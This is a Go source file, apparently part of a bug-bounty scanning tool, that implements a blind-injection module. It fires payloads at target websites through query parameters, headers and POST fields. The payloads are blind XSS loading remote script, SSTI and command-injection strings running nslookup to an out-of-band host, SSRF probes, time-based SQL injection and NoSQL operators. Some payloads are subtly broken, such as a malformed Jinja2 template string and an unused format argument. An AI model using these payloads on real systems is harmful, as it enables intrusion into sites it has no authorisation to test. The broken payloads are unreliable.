package tools

import (
	"github.com/Developer-Army/BBPTS/internal/domain/recon"
	"context"
	"fmt"
	"log/slog"
	"net/http"
	"net/url"
	"strings"
	"time"

	"golang.org/x/time/rate"
)

type BlindInjectTool struct{}

type blindPayload struct {
	Class   string
	Payload string
}

func (t *BlindInjectTool) Name() string {
	return "blind_inject"
}

func (t *BlindInjectTool) Run(ctx context.Context, scanCtx *recon.ScanContext, targets []string, threads int) ([]recon.Event, error) {
	if len(targets) == 0 {
		return nil, nil
	}

	oobURL := scanCtx.InteractshOOBURL
	if oobURL == "" {
		slog.Debug("blind_inject: no Interactsh OOB URL, skipping")
		return nil, nil
	}

	rateLimit := ToolRateLimitFromCtx(ctx, t.Name())
	if rateLimit <= 0 {
		rateLimit = 20
	}
	pool := NewWorkerPool(threads, rate.Limit(rateLimit))

	payloads := t.buildPayloads(oobURL)

	return pool.Process(ctx, targets, func(ctx context.Context, target string) ([]recon.Event, error) {
		target = strings.TrimSpace(target)
		if target == "" {
			return nil, nil
		}
		if !strings.HasPrefix(target, "http://") && !strings.HasPrefix(target, "https://") {
			target = "https://" + target
		}

		client := NewSafeHTTPClient(10 * time.Second)
		var events []recon.Event

		// Inject into URL parameters
		events = append(events, t.testURLParams(ctx, client, target, payloads, scanCtx.Headers)...)

		// Inject into common header fields
		events = append(events, t.testHeaders(ctx, client, target, payloads, scanCtx.Headers)...)

		// Inject into POST body fields
		events = append(events, t.testPOSTBody(ctx, client, target, payloads, scanCtx.Headers)...)

		return events, nil
	})
}

func (t *BlindInjectTool) buildPayloads(oobURL string) []blindPayload {
	return []blindPayload{
		{
			Class:   "blind_xss",
			Payload: fmt.Sprintf(`"><script src="https://%s/x.js"></script>`, oobURL),
		},
		{
			Class:   "blind_xss_attr",
			Payload: fmt.Sprintf(`" onfocus=alert(1) autofocus="`, oobURL),
		},
		{
			Class:   "blind_xss_event",
			Payload: fmt.Sprintf(`"><img src=x onerror="var s=document.createElement('script');s.src='https://%s/p.js';document.body.appendChild(s)">`, oobURL),
		},
		{
			Class:   "blind_ssti_freemarker",
			Payload: fmt.Sprintf(`${nslookup('%s')}`, oobURL),
		},
		{
			Class:   "blind_ssti_jinja2",
			Payload: fmt.Sprintf(`{{lipsum.__globals__['__import____('os').popen('nslookup %s').read()}}`, oobURL),
		},
		{
			Class:   "blind_ssti_thymeleaf",
			Payload: fmt.Sprintf(`[[${T(java.lang.Runtime).getRuntime().exec('nslookup %s')}]]`, oobURL),
		},
		{
			Class:   "blind_cmdi_semicolon",
			Payload: fmt.Sprintf(`; nslookup %s`, oobURL),
		},
		{
			Class:   "blind_cmdi_backtick",
			Payload: fmt.Sprintf("`nslookup %s`", oobURL),
		},
		{
			Class:   "blind_cmdi_dollar",
			Payload: fmt.Sprintf(`$(nslookup %s)`, oobURL),
		},
		{
			Class:   "blind_ssrf",
			Payload: fmt.Sprintf("http://%s/ssrf-probe", oobURL),
		},
		{
			Class:   "blind_ssrf_redirect",
			Payload: fmt.Sprintf("http://%s/redirect?to=http://internal", oobURL),
		},
		{
			Class:   "blind_sqli_time",
			Payload: "'; waitfor delay '0:0:5'--",
		},
		{
			Class:   "blind_nosql",
			Payload: `{"$gt": ""}`,
		},
	}
}

func (t *BlindInjectTool) testURLParams(ctx context.Context, client *http.Client, target string, payloads []blindPayload, baseHeaders map[string]string) []recon.Event {
	var events []recon.Event
	parsed, err := url.Parse(target)
	if err != nil {
		return nil
	}

	commonParams := []string{"q", "search", "query", "name", "email", "user", "id", "page", "url", "redirect", "callback", "data", "input", "value", "text", "message", "file", "path", "dir", "template", "cmd", "command"}

	for _, payload := range payloads {
		for _, param := range commonParams {
			testURL := fmt.Sprintf("%s://%s%s?%s=%s", parsed.Scheme, parsed.Host, parsed.Path, param, url.QueryEscape(payload.Payload))

			req, err := http.NewRequestWithContext(ctx, "GET", testURL, nil)
			if err != nil {
				continue
			}
			for k, v := range baseHeaders {
				req.Header.Set(k, v)
			}

			resp, err := client.Do(req)
			if err != nil {
				continue
			}
			resp.Body.Close()

			if resp.StatusCode == 200 || resp.StatusCode == 500 {
				events = append(events, recon.NewEvent(target, t.Name(), "injection_attempt", map[string]string{
					"injection_class": payload.Class,
					"param":           param,
					"method":          "GET",
					"status":          fmt.Sprintf("%d", resp.StatusCode),
					"payload":         payload.Payload,
					"description":     fmt.Sprintf("Blind %s payload injected via %s parameter", payload.Class, param),
				}))
			}
			_ = err
			break // One param per payload class per target
		}
	}

	return events
}

func (t *BlindInjectTool) testHeaders(ctx context.Context, client *http.Client, target string, payloads []blindPayload, baseHeaders map[string]string) []recon.Event {
	var events []recon.Event

	injectableHeaders := []string{"X-Forwarded-For", "User-Agent", "Referer", "X-Original-URL", "X-Rewrite-URL", "X-Forwarded-Host"}

	for _, payload := range payloads {
		for _, header := range injectableHeaders {
			req, err := http.NewRequestWithContext(ctx, "GET", target, nil)
			if err != nil {
				continue
			}
			for k, v := range baseHeaders {
				req.Header.Set(k, v)
			}
			req.Header.Set(header, payload.Payload)

			resp, err := client.Do(req)
			if err != nil {
				continue
			}
			resp.Body.Close()

			if resp.StatusCode == 200 || resp.StatusCode == 500 {
				events = append(events, recon.NewEvent(target, t.Name(), "injection_attempt", map[string]string{
					"injection_class": payload.Class,
					"header":          header,
					"method":          "GET",
					"status":          fmt.Sprintf("%d", resp.StatusCode),
					"payload":         payload.Payload,
					"description":     fmt.Sprintf("Blind %s payload injected via %s header", payload.Class, header),
				}))
			}
			break // One header per payload class
		}
	}

	return events
}

func (t *BlindInjectTool) testPOSTBody(ctx context.Context, client *http.Client, target string, payloads []blindPayload, baseHeaders map[string]string) []recon.Event {
	var events []recon.Event

	bodyFields := []string{"name", "email", "comment", "message", "subject", "title", "body", "text", "query", "search", "input", "data"}

	for _, payload := range payloads {
		for _, field := range bodyFields {
			body := url.Values{}
			body.Set(field, payload.Payload)

			req, err := http.NewRequestWithContext(ctx, "POST", target, strings.NewReader(body.Encode()))
			if err != nil {
				continue
			}
			for k, v := range baseHeaders {
				req.Header.Set(k, v)
			}
			req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

			resp, err := client.Do(req)
			if err != nil {
				continue
			}
			resp.Body.Close()

			if resp.StatusCode == 200 || resp.StatusCode == 500 {
				events = append(events, recon.NewEvent(target, t.Name(), "injection_attempt", map[string]string{
					"injection_class": payload.Class,
					"field":           field,
					"method":          "POST",
					"status":          fmt.Sprintf("%d", resp.StatusCode),
					"payload":         payload.Payload,
					"description":     fmt.Sprintf("Blind %s payload injected via POST %s field", payload.Class, field),
				}))
			}
			break // One field per payload class
		}
	}

	return events
}

var _ recon.Tool = (*BlindInjectTool)(nil)
